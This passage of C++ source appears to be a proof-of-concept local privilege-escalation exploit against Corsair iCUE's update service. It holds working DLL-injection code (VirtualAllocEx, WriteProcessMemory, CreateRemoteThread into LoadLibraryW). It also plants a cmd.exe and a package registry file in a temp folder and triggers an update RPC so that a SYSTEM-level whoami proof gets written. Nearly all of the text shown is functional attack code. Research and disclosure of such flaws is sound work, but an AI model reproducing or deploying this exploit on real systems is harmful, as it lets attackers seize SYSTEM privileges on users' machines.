  const FARPROC local_load = GetProcAddress(local_kernel, "LoadLibraryW");
  const std::uintptr_t remote_load = RemoteExportAddress(
      reinterpret_cast<std::uintptr_t>(local_kernel),
      reinterpret_cast<std::uintptr_t>(local_load), remote_kernel);
  if (!remote_load) return false;

  HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                   PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                   PROCESS_VM_READ | SYNCHRONIZE,
                               FALSE, pid);
  if (!process) return false;
  TargetFacts check;
  bool ok = GetTargetFacts(pid, &check) && ValidateTargetFacts(check);
  const SIZE_T bytes = (path.size() + 1) * sizeof(wchar_t);
  void* remote = nullptr;
  if (ok)
    remote = VirtualAllocEx(process, nullptr, bytes,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  SIZE_T written = 0;
  if (ok)
    ok = remote && WriteProcessMemory(process, remote, path.c_str(), bytes,
                                      &written) && written == bytes;
  HANDLE thread = nullptr;
  if (ok)
    thread = CreateRemoteThread(
        process, nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_load), remote, 0,
        nullptr);
  if (ok) ok = thread && WaitForSingleObject(thread, 15000) == WAIT_OBJECT_0;
  DWORD loaded = 0;
  if (ok) ok = GetExitCodeThread(thread, &loaded) && loaded != 0;
  if (thread) CloseHandle(thread);
  if (remote) VirtualFreeEx(process, remote, 0, MEM_RELEASE);
  CloseHandle(process);
  return ok;
}

std::wstring TempRoot() {
  wchar_t temp[MAX_PATH]{};
  const DWORD length = GetTempPathW(MAX_PATH, temp);
  if (!length || length >= MAX_PATH) return {};
  return std::wstring(temp, length) + L"iCUE2SYSTEM";
}

DWORD WINAPI ProofWorker(void*) {
  const std::wstring root = TempRoot();
  bool success = false;
  ServiceState service;
  const bool prepared = !root.empty() && PrepareControlledRoot(root);
  const bool service_ok = prepared && StartUpdateService(&service);
  if (service_ok) success = RunUpdateRpc(root);
  RestoreUpdateService(&service);
  if (!root.empty()) {
    DeleteFileW((root + L"\\cuepkg.registry").c_str());
    DeleteFileW((root + L"\\cmd.exe").c_str());
  }
  Debug(success ? L"SUCCESS: wrote %TEMP%\\iCUE2SYSTEM\\whoami.txt"
                : L"FAILED: SYSTEM identity proof was not produced");
  FreeLibraryAndExitThread(g_module, success ? 0 : 1);
}

bool HostIsIcue() {
  wchar_t image[32768]{};
  const DWORD length = GetModuleFileNameW(nullptr, image,
                                          static_cast<DWORD>(std::size(image)));
  return length && length < std::size(image) &&
         IsIcueHostName(std::wstring(image, length));
}

#endif  // !ICUE2SYSTEM_TEST

}  // namespace icue2system

#ifndef ICUE2SYSTEM_TEST
extern "C" __declspec(dllexport) void CALLBACK Run(HWND, HINSTANCE, LPSTR,
                                                    int) {
  using namespace icue2system;
  HANDLE run_lock = AcquireRunLock(L"Local\\iCUE2SYSTEM-RunLock");
  if (!run_lock) {
    Debug(L"FAILED: another iCUE2SYSTEM run is already active");
    return;
  }
  const auto release_lock = [&]() {
    ReleaseMutex(run_lock);
    CloseHandle(run_lock);
  };
  const std::wstring root = TempRoot();
  if (!root.empty()) DeleteFileW((root + L"\\whoami.txt").c_str());
  const DWORD pid = StartAndFindIcue();
  if (!pid || !InjectSelf(pid)) {
    Debug(L"FAILED: no validated current-user iCUE target was injected");
    release_lock();
    return;
  }
  const std::wstring proof = root + L"\\whoami.txt";
  const ULONGLONG deadline = GetTickCount64() + 45000;
  do {
    WIN32_FILE_ATTRIBUTE_DATA data{};
    if (GetFileAttributesExW(proof.c_str(), GetFileExInfoStandard, &data) &&
        (data.nFileSizeHigh || data.nFileSizeLow)) {
      Debug(L"SUCCESS: SYSTEM identity proof is ready");
      release_lock();
      return;
    }
    Sleep(250);
  } while (GetTickCount64() < deadline);
  Debug(L"FAILED: timed out waiting for the SYSTEM identity proof");
  release_lock();
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, void*) {
  using namespace icue2system;
  if (reason == DLL_PROCESS_ATTACH) {
    g_module = instance;
    DisableThreadLibraryCalls(instance);
    if (HostIsIcue()) {
      HANDLE thread = CreateThread(nullptr, 0, ProofWorker, nullptr, 0, nullptr);
      if (thread) CloseHandle(thread);
    }
  }
  return TRUE;
}
#endif
